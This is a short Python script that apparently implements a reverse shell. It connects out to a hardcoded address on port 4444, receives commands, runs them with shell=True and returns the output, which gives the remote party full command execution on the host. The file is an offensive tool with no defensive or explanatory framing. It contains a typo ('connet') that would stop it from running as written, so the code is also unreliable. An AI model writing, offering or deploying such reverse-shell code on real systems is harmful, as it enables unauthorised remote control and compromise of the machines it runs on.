import socket
import subprocess
def execute_system_command(command):
	return subprocess.check_output(command, shell=True)
connetion = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connetion.connet(("192.168.173.35", 4444))
connetion.send(b"\n[+] Connection established. \n")
while True:
	command = connetion.recv(1024)
	command_result = execute_system_command(command)
	connetion.send(command_result)

connetion.close()